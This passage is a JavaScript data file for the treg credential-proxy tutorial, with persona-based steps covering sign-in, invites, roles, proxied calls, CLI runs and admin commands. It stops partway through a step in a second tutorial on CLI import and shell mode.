/* tools-registry - the interactive tutorial, as data.
 *
 * SINGLE SOURCE OF TRUTH for the walkthrough. Both the in-dashboard Help view
 * (src/treg/web/index.html) and the standalone page (docs/tutorial.html) render
 * from `window.TREG_TUTORIAL` and highlight with `window.tregHL`, so they never drift.
 *
 * Each step: { part, who, title, explain, cmd, out, notice }.
 *   who ∈ tom | bob | alice | sys | ops   (drives the persona chip + colour)
 * Commands are copy-and-run. We simulate three people on one machine with an
 * isolated HOME per persona; a real user is on their own laptop and drops the HOME= prefix.
 */
(function () {
  const PERSONAS = {
    tom:   { label: "Tom · owner",        cls: "tom"   },
    bob:   { label: "Bob · member→admin", cls: "bob"   },
    alice: { label: "Alice · viewer",     cls: "alice" },
    sys:   { label: "setup",              cls: "sys"   },
    ops:   { label: "platform operator",  cls: "ops"   },
    you:   { label: "you · member",       cls: "you"   },
    sam:   { label: "Sam · restricted member", cls: "sam" },
  };

  const CONCEPTS = [
    { h: "Email is your identity",
      p: "You <b>are</b> a verified email. Three doors prove it - GitHub, an emailed <b>one-time code</b>, or an <b>invite code</b>. First proof registers you; every proof after is a login. No separate sign-up." },
    { h: "The proxy = a coat check",
      p: "You call the real upstream API <i>through</i> the registry. It swaps your tool reference for the real secret and injects it server-side. The key never lands on your machine; your token authorises the call." },
    { h: "A token = a (you, org) pair",
      p: "A <b>User</b> is an identity; an <b>Org</b> is a team that owns resources; a <b>Membership</b> links them with a role. Your <b>identity token</b> works across every org you belong to - <code>org use</code> picks the active one." },
    { h: "Invites attach to an email",
      p: "An owner/admin invites an <b>email</b>. Prove that email (any door) and the invite is yours to accept - no code needed. The code is a fast out-of-band shortcut, not a requirement." },
    { h: "Tool &amp; skill",
      p: "A <b>tool</b> = an upstream <code>base_url</code> + a list of credential <b>bindings</b> (a request may carry several). A <b>skill / bundle</b> = a recipe (SKILL.md) + its secrets + its tool(s), registered from a folder via <code>treg.json</code>." },
    { h: "Import",
      p: "<code>treg upload</code> is the bulk on-ramp: it scans a <code>.env</code> (matching ~80 providers) and/or a folder of skills, and registers everything you pick in one pass - building a <code>treg.json</code> for any skill that lacks one. Preview first with <code>treg scan</code> (read-only); idempotent, so re-run freely. <code>treg skill install</code> is the reverse: pull a shared skill onto your machine." },
    { h: "Two ways to use a tool",
      p: "<code>treg call</code> proxies an HTTP <b>API</b> - the secret is injected server-side and nothing lands on your machine. <code>treg run</code> runs a vendor <b>command-line tool</b> (stripe, gh, gcloud…) with the credential injected, so you use the CLI without owning it or logging in. Two tiers: <code>--local</code> (default; runs on your machine - on Linux the key is isolated under a dedicated <code>treg-run</code> user) and <code>--server</code> (runs on the registry server, so the key never reaches you). The owner opts each tool in first; <code>treg runs</code> is the audit log." },
  ];

  const ROLES = {
    cols: ["viewer", "member", "admin", "owner"],
    rows: [
      ["call tools, read inventory",             [1, 1, 1, 1]],
      ["register secrets / tools / skills",      [0, 1, 1, 1]],
      ["edit / delete own resources",            [0, 1, 1, 1]],
      ["edit / delete any resource in org",      [0, 0, 1, 1]],
      ["invite / remove members",                [0, 0, 1, 1]],
      ["change roles, delete org",               [0, 0, 0, 1]],
    ],
  };

  const STEPS = [
    // ---- Setup ------------------------------------------------------------
    { part: "Setup", who: "sys", title: "Simulate three people on one machine",
      explain: "We play three users on one laptop by giving each its own <code>HOME</code>, so each gets an isolated <code>~/.treg/config.json</code> pointed at the registry. In real life every person is on their own machine and drops the <code>HOME=</code> prefix.",
      cmd: `for u in tom bob alice; do\n  mkdir -p ~/.treg-personas/$u\n  HOME=~/.treg-personas/$u treg config --base-url https://treg.ngrok.app\ndone`,
      out: `# each persona now points at the registry`,
      notice: "Prefix any command with <code>HOME=~/.treg-personas/&lt;name&gt;</code> to act as that person." },

    // ---- Part 1 - Tom founds Superdesign ---------------------------------
    { part: "Part 1 · Tom founds Superdesign", who: "tom", title: "Tom signs in (the email door)",
      explain: "There is no <code>register</code>. Tom proves his email with a one-time code - and since it's his first time, that same act <b>creates</b> him plus a personal org (so there's never an empty state). The code is <b>emailed</b> to him; he checks his inbox and types it in.",
      cmd: `HOME=~/.treg-personas/tom treg login --email tom@superdesign.dev`,
      out: `We sent a 6-digit code to tom@superdesign.dev.\nEnter code: 429641\n✓ Logged in as tom@superdesign.dev. Active org: tom-superdesign-dev`,
      notice: "Check your inbox for the 6-digit code, then enter it. Tom now holds an <b>identity token</b> that works across every org he joins. <span class=\"muted\">(A dev box can set <code>TREG_EMAIL_DEV_MODE=true</code> to print the code inline instead.)</span>" },

    { part: "Part 1 · Tom founds Superdesign", who: "tom", title: "Tom creates the team",
      explain: "His personal org is just his own. Now he spins up the shared team and becomes its <b>owner</b>; his active org switches to it, so everything after runs there.",
      cmd: `HOME=~/.treg-personas/tom treg org create "Superdesign"`,
      out: `{\n  "org": "superdesign",\n  "org_id": 2,\n  "name": "Superdesign",\n  "role": "owner",\n  "token": "<per-org token - agents/CI; a human doesn't need it>"\n}`,
      notice: "Personal orgs are auto-made on sign-in; <b>teams are created explicitly</b> with <code>org create</code>." },

    // ---- Part 2 - Bob joins via the email door ---------------------------
    { part: "Part 2 · Bob joins (email door)", who: "tom", title: "Tom invites Bob",
      explain: "Tom invites a teammate by <b>email</b>. The invite attaches to that email and Tom gets a one-time code he <i>could</i> hand over - but Bob won't even need it.",
      cmd: `HOME=~/.treg-personas/tom treg org invite bob@superdesign.dev --role member`,
      out: `{\n  "code": "<one-time-invite-code>",\n  "email": "bob@superdesign.dev",\n  "role": "member",\n  "org_id": 2,\n  "expires_at": "2026-07-09T…"\n}`,
      notice: "The invite is pending, addressed to Bob's email, valid 7 days (<code>--expires-days</code> to change)." },

    { part: "Part 2 · Bob joins (email door)", who: "bob", title: "Bob signs in as himself",
      explain: "Switch to Bob. He proves his email the same way - and since it's his first time, this <b>creates</b> him too, with his own identity token and personal org. He never touches the invite code.",
      cmd: `HOME=~/.treg-personas/bob treg login --email bob@superdesign.dev`,
      out: `We sent a 6-digit code to bob@superdesign.dev.\nEnter code: 512740\n✓ Logged in as bob@superdesign.dev. Active org: bob-superdesign-dev`,
      notice: "Same door as Tom: the code lands in Bob's inbox, he enters it. The email is the identity - the door (GitHub / code) is just how you prove it." },

    { part: "Part 2 · Bob joins (email door)", who: "bob", title: "Bob sees his invite - no code",
      explain: "Because the invite is tied to Bob's now-proven email, he can just ask what's waiting for him. This is the full circle: proving the email reveals every invite addressed to it.",
      cmd: `HOME=~/.treg-personas/bob treg invites`,
      out: `[\n  {\n    "id": 1,\n    "org": "superdesign",\n    "org_id": 2,\n    "name": "Superdesign",\n    "role": "member",\n    "invited_by": "tom@superdesign.dev",\n    "expires_at": "2026-07-09T…"\n  }\n]`,
      notice: "No code, no copy-paste from Tom - the proven email is the proof." },

    { part: "Part 2 · Bob joins (email door)", who: "bob", title: "Bob accepts",
      explain: "Bob joins Superdesign by naming the org. No code - his proven identity is the proof. His active org switches to Superdesign.",
      cmd: `HOME=~/.treg-personas/bob treg accept superdesign`,
      out: `{\n  "org": "superdesign",\n  "org_id": 2,\n  "name": "Superdesign",\n  "role": "member"\n}`,
      notice: "Bob is now a <b>member</b> of Superdesign." },

    { part: "Part 2 · Bob joins (email door)", who: "bob", title: "Bob's two hats",
      explain: "One identity, two memberships - owner of his personal org, member of Superdesign. The same identity token works in both.",
      cmd: `HOME=~/.treg-personas/bob treg org ls`,
      out: `  bob-superdesign-dev    bob@superdesign.dev    owner\n* superdesign            Superdesign            member   (active)`,
      notice: "The <code>*</code> marks the active org. Switch anytime with <code>treg org use &lt;slug&gt;</code>." },

    // ---- Part 3 - Alice joins via the code door --------------------------
    { part: "Part 3 · Alice joins (code door)", who: "tom", title: "Tom invites Alice as a viewer",
      explain: "The other door: the <b>code</b>. First Tom invites Alice as a <b>viewer</b> - she'll be able to read and call, but not register anything.",
      cmd: `HOME=~/.treg-personas/tom treg org invite alice@superdesign.dev --role viewer`,
      out: `{\n  "code": "ZTeW5ss-cXiyvzeMs3em-…",\n  "email": "alice@superdesign.dev",\n  "role": "viewer",\n  "org_id": 2,\n  "expires_at": "2026-07-09T…"\n}`,
      notice: "This time we <b>keep the code</b> - Alice uses it directly next." },

    { part: "Part 3 · Alice joins (code door)", who: "alice", title: "Alice joins by code (no login first)",
      explain: "The contrast with Bob: Alice <b>never runs</b> <code>login</code>. The code itself proves her email, so <code>join</code> creates her, adds her to Superdesign, and saves her token - all in one command.",
      cmd: `HOME=~/.treg-personas/alice treg org join ZTeW5ss-cXiyvzeMs3em-… --email alice@superdesign.dev`,
      out: `{\n  "org": "superdesign", "org_id": 2, "name": "Superdesign", "role": "viewer",\n  "token": "<alice's superdesign token>",\n  "personal": { "org": "alice-superdesign-dev", "org_id": 4, "role": "owner",\n                "token": "<alice's personal token>" }\n}`,
      notice: "One command created Alice, gave her a personal org, and made her a viewer - Tom never handled her token." },

    { part: "Part 3 · Alice joins (code door)", who: "alice", title: "The viewer role has teeth",
      explain: "Alice can read and call, but a viewer <b>cannot register</b> anything. Watch her get stopped.",
      cmd: `HOME=~/.treg-personas/alice treg secret add testkey --value "nope"`,
      out: `{\n  "detail": "viewers can call and read, but cannot register"\n}`,
      notice: "Alice was granted <i>use</i>, not <i>write</i> - the role gate doing its job." },

    // ---- Part 4 - A tool through the proxy -------------------------------
    { part: "Part 4 · A tool through the proxy", who: "bob", title: "Bob registers a secret",
      explain: "Unlike Alice, a <b>member</b> can register. Bob adds an API key - encrypted server-side, its value never returned again.",
      cmd: `HOME=~/.treg-personas/bob treg secret add echo-key --value "sk-demo-secret-123"`,
      out: `{\n  "id": 1,\n  "name": "echo-key",\n  "kind": "env",\n  "owner": "bob@superdesign.dev",\n  "bundle_id": null\n}`,
      notice: "The secret is org-scoped (lives in Superdesign) and owned by Bob. A tool binds to it by <code>id</code>." },

    { part: "Part 4 · A tool through the proxy", who: "bob", title: "Bob registers a tool",
      explain: "A tool = an upstream <code>base_url</code> + how to inject the credential. We point at postman-echo so we can <i>see</i> the injection. A single <code>--secret</code> defaults to a <code>Bearer</code> token in the <code>Authorization</code> header.",
      cmd: `HOME=~/.treg-personas/bob treg tool add echo --base-url https://postman-echo.com --secret 1`,
      out: `{\n  "id": 1, "name": "echo", "owner": "bob@superdesign.dev",\n  "base_url": "https://postman-echo.com", "host": "postman-echo.com",\n  "bindings": [\n    { "secret_id": 1, "injector": "env", "location": "header",\n      "name": "Authorization", "format": "Bearer {secret}", "secret_field": "access_token" }\n  ]\n}`,
      notice: "For multi-credential upstreams, add more bindings with <code>--bind</code> - treg applies every binding on each call." },

    { part: "Part 4 · A tool through the proxy", who: "alice", title: "Alice calls it - with no key",
      explain: "The whole point of treg. Alice is a <b>viewer</b> with <b>no secret</b> on her machine. Yet when she calls, the upstream sees Bob's key, injected server-side.",
      cmd: `HOME=~/.treg-personas/alice treg call echo /get`,
      out: `{\n  "args": {},\n  "headers": {\n    "host": "postman-echo.com",\n    "authorization": "Bearer sk-demo-secret-123",\n    …\n  },\n  "url": "https://postman-echo.com/get"\n}`,
      notice: "<code>authorization: Bearer sk-demo-secret-123</code> - Bob's secret, which Alice never had, saw, or stored." },

    { part: "Part 4 · A tool through the proxy", who: "tom", title: "Every call is on the record",
      explain: "The proxy writes an audit row per call. The owner reviews the org's activity.",
      cmd: `HOME=~/.treg-personas/tom treg calls --limit 5`,
      out: `[\n  {\n    "id": 1,\n    "user_email": "alice@superdesign.dev",\n    "tool_name": "echo",\n    "method": "GET",\n    "path": "https://postman-echo.com/get",\n    "status_code": 200,\n    "created_at": "2026-07-02T…"\n  }\n]`,
      notice: "Even though Alice used Bob's secret, the ledger records <b>who</b> actually made the call." },

    // ---- Part 5 - Call shapes & skills -----------------------------------
    { part: "Part 5 · Call shapes & skills", who: "alice", title: "Call by full URL (agent-native)",
      explain: "An agent often already knows the real upstream URL. Instead of <code>call &lt;tool&gt; &lt;path&gt;</code>, hand treg the <b>whole URL</b> - it matches the host to a registered tool and injects the key. No treg-specific knowledge needed.",
      cmd: `HOME=~/.treg-personas/alice treg call https://postman-echo.com/get`,
      out: `# same echo response, with "authorization": "Bearer sk-demo-secret-123" injected.\n# note: no tool name in the command - just the destination URL.`,
      notice: "treg resolves the tool by <b>host</b>, so the agent-native full-URL form just works." },

    { part: "Part 5 · Call shapes & skills", who: "alice", title: "The raw HTTP underneath",
      explain: "<code>treg call</code> is sugar. Under the hood it's a plain HTTP request to <code>&lt;proxy&gt;/call/&lt;upstream-url&gt;</code> with your token header - any language, any agent, <code>curl</code>.",
      cmd: `ATOK=$(python3 -c "import json;print(json.load(open('/Users/you/.treg-personas/alice/.treg/config.json'))['token'])")\ncurl -s -H "X-Treg-Token: $ATOK" \\\n  "https://treg.ngrok.app/call/https://postman-echo.com/get"`,
      out: `# the postman-echo JSON again, "authorization": "Bearer sk-demo-secret-123" injected -\n# just curl, no secret on the client.`,
      notice: "The whole product in one line: prefix any upstream URL with the proxy, send your token, treg swaps in the real credential." },

    { part: "Part 5 · Call shapes & skills", who: "bob", title: "Draft a skill's registration",
      explain: "A whole skill folder (a recipe + credential files) can register in one shot via a <code>treg.json</code> contract. <code>skill init</code> scans <code>SKILL.md</code> + the <code>.secret/</code> dir and drafts it - guessing the base URL and finding the secret. No values go in the file, only references.",
      cmd: `HOME=~/.treg-personas/bob treg skill init --dir /tmp/skills/echo-svc`,
      out: `wrote /tmp/skills/echo-svc/treg.json\n  auto: base_url=https://postman-echo.com | secrets=['echo-svc']\n  review / fill:\n    - base_url - heuristic guess, verify\n    - health / examples - optional`,
      notice: "It read the recipe and correctly guessed <code>base_url</code> + found the secret - fix anything it flagged, then register." },

    { part: "Part 5 · Call shapes & skills", who: "bob", title: "Upload the whole skill",
      explain: "One command turns the folder into a live tool: the recipe, the secret (value loaded from <code>.secret/</code>, never the json), and the tool - all created atomically as a <b>bundle</b>.",
      cmd: `HOME=~/.treg-personas/bob treg skill add --dir /tmp/skills/echo-svc`,
      out: `{\n  "id": 1, "name": "echo-svc", "owner": "bob@superdesign.dev",\n  "recipe": "# echo-svc\\n…the SKILL.md…",\n  "tools":   [{ "id": 2, "name": "echo-svc", "base_url": "https://postman-echo.com", "bundle_id": 1 }],\n  "secrets": [{ "id": 2, "name": "echo-svc", "kind": "env", "bundle_id": 1 }]\n}`,
      notice: "Everything shares a <code>bundle_id</code>, so a skill deletes as one unit too." },

    // ---- Part 5b - Import: the magic bulk on-ramp ------------------------
    { part: "Part 5b · Import - the magic bulk on-ramp", who: "bob", title: "Turn your whole .env into tools",
      explain: "The steps above, but for your <i>entire</i> environment at once. <code>treg upload env</code> reads your <code>.env</code>, matches each variable against a catalog of ~80 providers (OpenAI, Stripe, Resend, Render…), and registers the ones you pick as ready-to-call tools. It reads <b>names only</b> to detect - the value is loaded just for the keys you confirm. Config vars (<code>*_HOST</code>, <code>*_MODEL</code>) and your app's own secrets (<code>SECRET_KEY</code>, <code>DATABASE_URL</code>) are excluded automatically.",
      cmd: `HOME=~/.treg-personas/bob treg upload env --select openai,stripe,resend`,
      out: `Scanned .env: 6 key(s) to register, 1 OAuth, 4 other.\n  ✓ openai         https://api.openai.com/v1   [Authorization: Bearer {secret}]\n  ✓ stripe         https://api.stripe.com/v1    [Authorization: Bearer {secret}]\n  ✓ resend         https://api.resend.com       [Authorization: Bearer {secret}]\n\nRegistered 3/3 tools.`,
      notice: "One command, three live proxied tools. GitHub-style <code>CLIENT_ID</code>+<code>CLIENT_SECRET</code> pairs are detected as OAuth and offered a guided connect instead of a broken bearer key." },

    { part: "Part 5b · Import - the magic bulk on-ramp", who: "bob", title: "Import a whole folder of skills",
      explain: "Point <code>treg upload skills</code> at a directory of skills. For each, it uses an existing <code>treg.json</code>, or <b>builds one</b> from the skill's script (base URL + which env var it reads) - registering API skills as tools and knowledge skills as recipe-only bundles, so the <i>whole team library</i> lands in the registry in one pass. Re-run any time; it skips what's already there (or <code>--replace</code> to update).",
      cmd: `HOME=~/.treg-personas/bob treg upload skills --dir ~/.claude/skills --all`,
      out: `Scanned ~/.claude/skills: 5 API-tool skill(s), 23 recipe-only.\n  ✓ render          (tool)   [wrote treg.json]\n  ✓ intercom        (tool)\n  ✓ seo-blog-writer (recipe)\n  … \nImported 27/28 skills.`,
      notice: "A teammate then pulls any of them with <code>treg skill install &lt;name&gt;</code> - the shared library, installable in one command. Bare <code>treg upload</code> does both env + skills for the current dir." },

    // ---- Part 5c - Run a vendor CLI --------------------------------------
    { part: "Part 5c · Run a CLI tool", who: "tom", title: "Turn on `run` for a CLI tool",
      explain: "Every tool so far was an HTTP <b>API</b> you <code>call</code>. Many providers also ship a <b>command-line tool</b> (stripe, gh, gcloud…). <code>treg run</code> executes that CLI with the org's credential injected - so a teammate uses it <i>without</i> owning the key or logging in. Because a run hands the credential to a machine, the owner opts each tool in first (the dashboard's <b>⌘ run</b> toggle is the same switch). Here Tom enables it for the <code>stripe</code> tool (its id from <code>tool ls</code>).",
      cmd: `HOME=~/.treg-personas/tom treg tool update 4 --local-run on`,
      out: `{\n  "id": 4, "name": "stripe",\n  "base_url": "https://api.stripe.com/v1",\n  "cli": { "enabled": true }\n}`,
      notice: "Off by default - a run is more powerful than a proxied call, so it's opt-in per tool, and only an owner/admin can flip it." },

    { part: "Part 5c · Run a CLI tool", who: "bob", title: "Run the vendor CLI - no login, nothing on disk",
      explain: "Now Bob runs Stripe's real CLI <i>through</i> treg. Everything after <code>--</code> is handed to the vendor tool verbatim. treg injects the credential just for this run; Bob never logged into Stripe or stored its key. The default tier is <code>--local</code> - it runs on Bob's own machine, and on Linux the key is isolated under a dedicated <code>treg-run</code> user (installed once with <code>sudo treg setup-local-run</code>; on macOS it's best-effort). Add <code>--server</code> to run it on the registry instead, for a catalog-known CLI, so the key never reaches Bob's machine at all.",
      cmd: `HOME=~/.treg-personas/bob treg run stripe -- get /v1/balance`,
      out: `{\n  "object": "balance",\n  "available": [{ "amount": 0, "currency": "usd" }],\n  …\n}\n# Stripe's own CLI ran with the org key injected - Bob never logged in or held the key.`,
      notice: "<code>treg run &lt;tool&gt; -- &lt;args&gt;</code> for a CLI; <code>treg call &lt;tool&gt; &lt;path&gt;</code> for an HTTP API - same credential, two ways to use it." },

    { part: "Part 5c · Run a CLI tool", who: "tom", title: "Every run is on the record",
      explain: "Like proxied calls, CLI runs are audited. A <code>--server</code> run is recorded in the run ledger with its exit code and duration; a <code>--local</code> run leaves its audit trail beside the calls (<code>treg calls</code>). The owner reviews server runs with <code>treg runs</code>.",
      cmd: `HOME=~/.treg-personas/tom treg runs --limit 5`,
      out: `[\n  {\n    "id": 1,\n    "user_email": "bob@superdesign.dev",\n    "bundle_name": "stripe",\n    "argv": ["get", "/v1/balance"],\n    "exit_code": 0,\n    "duration_ms": 812,\n    "created_at": "2026-07-02T…"\n  }\n]`,
      notice: "The mnemonic: <code>treg call</code> → <code>treg calls</code>; <code>treg run</code> → <code>treg runs</code>. Two verbs, two ledgers." },

    // ---- Part 6 - Org administration -------------------------------------
    { part: "Part 6 · Org administration", who: "tom", title: "See the team",
      explain: "The owner lists everyone and their roles. Role changes reference a member by <code>user_id</code>.",
      cmd: `HOME=~/.treg-personas/tom treg org members`,
      out: `[\n  { "user_id": 1, "email": "tom@superdesign.dev",   "role": "owner"  },\n  { "user_id": 2, "email": "bob@superdesign.dev",   "role": "member" },\n  { "user_id": 3, "email": "alice@superdesign.dev", "role": "viewer" }\n]`,
      notice: "The full roster from one command." },

    { part: "Part 6 · Org administration", who: "tom", title: "Promote Bob to admin",
      explain: "Only an owner changes roles. Let's make Bob an <b>admin</b> - he can invite/manage, but transfer and delete stay owner-only. The last-owner guard stops an org from becoming ownerless.",
      cmd: `HOME=~/.treg-personas/tom treg org set-role 2 admin`,
      out: `{\n  "user_id": 2,\n  "role": "admin",\n  "org_id": 2\n}`,
      notice: "One primitive (<code>set-role</code>) covers promotion, demotion, and ownership transfer." },

    { part: "Part 6 · Org administration", who: "bob", title: "Admin rights in action",
      explain: "As a plain member Bob couldn't invite; as an <b>admin</b> he can. He invites a new teammate.",
      cmd: `HOME=~/.treg-personas/bob treg org invite dana@superdesign.dev --role member`,
      out: `{\n  "code": "<one-time-code>",\n  "email": "dana@superdesign.dev",\n  "role": "member",\n  "org_id": 2,\n  "expires_at": "2026-07-09T…"\n}`,
      notice: "Bob manages the team without being the owner." },

    { part: "Part 6 · Org administration", who: "bob", title: "Review pending invites",
      explain: "Admins see every invite still outstanding for the org. Accepted, revoked, and expired ones are filtered out.",
      cmd: `HOME=~/.treg-personas/bob treg org invites`,
      out: `[\n  {\n    "id": 3, "email": "dana@superdesign.dev", "role": "member",\n    "invited_by": "bob@superdesign.dev", "expires_at": "2026-07-09T…"\n  }\n]`,
      notice: "Only Dana shows - Bob's and Alice's invites are already accepted, so they're gone from the list." },

    { part: "Part 6 · Org administration", who: "bob", title: "Revoke an invite",
      explain: "Plans change - Bob kills Dana's invite before she uses it. This hard-deletes the code so it can never be accepted.",
      cmd: `HOME=~/.treg-personas/bob treg org revoke 3`,
      out: `{\n  "revoked_invite": 3\n}`,
      notice: "At join time: expired → <code>410</code>; revoked / used / unknown → <code>404 invalid or already-used invite</code>." },

    { part: "Part 6 · Org administration", who: "alice", title: "The role gate, from the viewer side",
      explain: "Alice is a viewer. She can call tools, but she can't invite - that needs admin+. She gets refused.",
      cmd: `HOME=~/.treg-personas/alice treg org invite eve@superdesign.dev --role member`,
      out: `{\n  "detail": "admin role in this org is required"\n}`,
      notice: "Roles, cleanly enforced: <b>owner</b> &gt; <b>admin</b> &gt; <b>member</b> &gt; <b>viewer</b>." },

    // ---- Part 7 - Super-admin --------------------------------------------
    { part: "Part 7 · Super-admin", who: "ops", title: "Become the platform operator",
      explain: "Super-admin sits <i>above</i> orgs - it reads and manages every tenant. Two ways to authorise: the platform bearer <code>TREG_ADMIN_TOKEN</code>, or a user flagged <code>is_superadmin</code>. We use the bearer, read from <code>.env</code> so it never appears on screen.",
      cmd: `treg admin login --token "$(grep -E '^TREG_ADMIN_TOKEN=' .env | cut -d= -f2-)"`,
      out: `admin token saved`,
      notice: "Gated by <code>require_superadmin</code>, separate from org roles: a normal token → 403, no token → 401." },

    { part: "Part 7 · Super-admin", who: "ops", title: "The whole platform at a glance",
      explain: "One call gives totals across every tenant - the picture no single org owner can see. Plus <code>admin orgs / users / tools / health</code> for cross-tenant inventory.",
      cmd: `treg admin stats`,
      out: `{\n  "totals": { "users": 3, "orgs": 4, "tools": 2, "secrets": 2, "calls": 1 },\n  …recent-activity + distributions…\n}`,
      notice: "Portal-ready JSON: distributions by injector/host, a credential-health rollup, call volume, and growth counts." },

    { part: "Part 7 · Super-admin", who: "ops", title: "Every org, across all tenants",
      explain: "Cross-tenant visibility: Superdesign with its members + tools, plus everyone's personal orgs.",
      cmd: `treg admin orgs`,
      out: `[\n  { "id": 2, "slug": "superdesign", "name": "Superdesign", "members": 3, "tools": 2 },\n  { "id": 1, "slug": "tom-superdesign-dev", "members": 1, "tools": 0 },\n  { "id": 3, "slug": "bob-superdesign-dev", "members": 1, "tools": 0 },\n  { "id": 4, "slug": "alice-superdesign-dev", "members": 1, "tools": 0 }\n]`,
      notice: "The seam a support console or billing portal sits on later - same JSON, just rendered." },

    { part: "Part 7 · Super-admin", who: "ops", title: "Grant a real user super-admin",
      explain: "The env bearer bootstraps; then you promote named users so they reach <code>/admin/*</code> with their own identity token - no shared secret to pass around.",
      cmd: `treg admin grant 1`,
      out: `{\n  "user_id": 1,\n  "is_superadmin": true\n}`,
      notice: "After the grant, Tom's normal identity token works on <code>admin</code> commands - and the dashboard's Admin panel lights up for him." },

    // ---- Part 8 - The dashboard -----------------------------------------
    { part: "Part 8 · The dashboard", who: "tom", title: "The same registry, in the browser",
      explain: "Open <b>treg.ngrok.app</b> and sign in with the <b>email code</b> door (the same one you used in the terminal): type your email → click <b>Email me a sign-in code</b> → <b>check your inbox</b> for the 6-digit code → paste it in and <b>Sign in</b>. You land on your team org - Tools shows the <code>echo</code> tool, Activity shows the call, and (since Tom is now super-admin) an <b>Admin</b> panel appears.",
      cmd: `open https://treg.ngrok.app/`,
      out: `# Sign in with email → land on Superdesign\n#   Tools    → the echo tool (Copy a snippet · Try it live)\n#   Activity → Alice's GET echo · 200\n#   Admin    → cross-tenant stats + orgs (super-admin only)`,
      notice: "The dashboard now does it all in the browser - create teams, invite members, add secrets, register tools & skills, plus the super-admin surface - not just read + call." },

    // ---- Part 9 - Cleanup ------------------------------------------------
    { part: "Part 9 · Cleanup", who: "bob", title: "Delete the tool",
      explain: "Bob (its creator, and an admin) removes the tool. The bound secret stays - only the tool goes. A member can't delete a teammate's resource.",
      cmd: `HOME=~/.treg-personas/bob treg tool rm 1`,
      out: `{\n  "deleted": 1\n}`,
      notice: "Delete order matters: remove the tool (or its binding) before the secret it uses." },

    { part: "Part 9 · Cleanup", who: "tom", title: "Delete the org (full cascade)",
      explain: "The finale. Deleting an org is owner-only and <b>confirm-by-name</b> - you must type the slug, and it must be your active org. The cascade removes all memberships, tools, secrets, bundles, invites, and audit rows.",
      cmd: `HOME=~/.treg-personas/tom treg org delete superdesign`,
      out: `{\n  "deleted_org": 2\n}`,
      notice: "Bob and Alice keep their personal orgs - they were separate tenants all along. That's the full lifecycle: sign in → team → invite (both doors) → roles → tool → proxied call → audit → admin → tear down. 🏁" },

    // ---- Further, focused tutorials --------------------------------------
    { part: "Further tutorials", who: "sys", title: "Two deep-dive tutorials",
      explain: "Two features have their own step-by-step tutorials - <b>Import &amp; shell</b> and <b>Team access control</b>. Both are cards on the Tutorial page (← Tutorials, top left), and both also exist as plain markdown.",
      cmd: `open https://treg.ngrok.app/tutorial-import-shell.md   # import + shell + the security sandbox\nopen https://treg.ngrok.app/tutorial-access.md         # per-member tool access control`,
      out: `# import-shell : treg upload clis (your machine's CLIs -> team tools) + treg shell (stripe/gh just work)\n#                + the local-run sandbox (isolated user, egress allow-list, filesystem jail)\n# access       : choose which tools each member may use + the local-run on/off toggle`,
      notice: "Pick them from the Tutorial page like this one, or open the markdown URLs directly (agent-friendly)." },
  ];

  // ---- Focused tutorial: Import & shell ----------------------------------
  // Prose twin: src/treg/web/tutorial-import-shell.md (served at /tutorial-import-shell.md).
  const IMPORT_SHELL = [
    { part: "Part 1 · Auto-import", who: "you", title: "Preview what would be registered",
      explain: "You already have <code>gh</code>, <code>stripe</code>, <code>gcloud</code> … installed and logged in. <code>treg scan clis</code> reads your machine: for each CLI in treg's catalog it checks whether the program is installed, whether its API key is in your environment, and whether you are logged into the CLI itself. It writes <b>nothing</b> - it only reports.",
      cmd: `treg scan clis`,
      out: `Scanned 21 catalog CLIs — 9 installed here.\n\nWould register (server, key injected):\n  openai\n  stripe\nWould register (local, uses your login):\n  doctl\n  flyctl\n  gcloud\n  gh\n  supabase\n  vercel\nNot supported:\n  az: az has no token-override env var (device/browser login only)\n\n12 more catalog CLIs aren't installed. List them with: treg scan clis --status`,
      notice: "Two tiers. <b>Server</b> (openai, stripe): the key is in your environment, so treg can hold it and inject it - the key never touches a member's machine. <b>Local</b> (gh, gcloud, …): you're logged into the CLI itself, so treg registers it with no secret and just runs the CLI you already authenticated." },

    { part: "Part 1 · Auto-import", who: "you", title: "Register them",
      explain: "Same scan, but it registers. <code>--replace</code> deletes-and-recreates anything already registered, so re-running is always safe.",
      cmd: `treg upload clis --replace`,
      out: `Scanned 21 catalog CLIs — 9 installed here.\n\nRegistered (server, key injected):\n  openai\n  stripe\nRegistered (local, uses your login):\n  doctl\n  flyctl\n  gcloud\n  gh\n  supabase\n  vercel`,
      notice: "The server-tier CLIs uploaded their key (encrypted) and are now bound tools; the local-tier CLIs registered <b>secret-less</b> - \"inject nothing, just run the program the member is logged into.\"" },

    { part: "Part 1 · Auto-import", who: "you", title: "Confirm a local-tier CLI runs",
      explain: "A local-tier tool needs no credential at all - treg runs the program you're already logged into, and records the run.",
      cmd: `treg run gh -- --version`,
      out: `▸ gh · audit #58\ngh version 2.72.0 (2025-04-30)\nhttps://github.com/cli/cli/releases/tag/v2.72.0`,
      notice: "The <code>▸ gh · audit #58</code> line (on standard error) shows treg wrapped and recorded the run; the rest is gh's own output." },

    { part: "Part 1 · Auto-import", who: "you", title: "See what's missing; add an off-catalog CLI",
      explain: "<code>--status</code> lists the catalog CLIs you do <b>not</b> have, with the install command for each. <code>--add BIN</code> registers an installed CLI that isn't in the catalog at all - it asks for the env var the CLI reads its key from and the API base URL.",
      cmd: `treg scan clis --status\ntreg upload clis --add mycli --env MYCLI_TOKEN --base-url https://api.mycli.com`,
      out: `In the catalog, not installed here:\n  glab          brew install glab\n  render        brew install render-oss/render/render\n  neonctl       npm i -g neonctl\n  …`,
      notice: "<code>--add</code> also prints a catalog-entry snippet you can share. An off-catalog CLI isn't on the server's allow-list, so it runs <b>locally</b> until an admin allow-lists its program name." },

    // ---- Shell mode --------------------------------------------------------
    { part: "Part 2 · Shell mode", who: "you", title: "Start the shell",
      explain: "Typing <code>treg run</code> before every command is friction. <code>treg shell start</code> opens a subshell where every <b>registered</b> CLI runs with the team credential injected automatically - you just type <code>stripe</code>, <code>gh</code>, <code>gcloud</code> as normal.",
      cmd: `treg shell start`,
      out: `▚ treg shell — you're now in a shell where your team's CLIs just work.\n  The tools below run with the team credential injected for you — no \`treg run\`,\n  no keys on this machine, and every call is audited.\n\n  Injected here (8):  doctl  flyctl  gcloud  gh  openai  stripe  supabase  vercel\n\n  Leave any time with exit (or Ctrl-D) — your normal shell returns unchanged.\n\n(treg) $`,
      notice: "A private folder goes first on your <code>PATH</code> with one small wrapper (\"shim\") per registered CLI. The credential is <b>not</b> in this shell's environment - it is fetched per command, and exists only inside the one subprocess treg spawns." },

    { part: "Part 2 · Shell mode", who: "you", title: "Use a team CLI - no `treg run`",
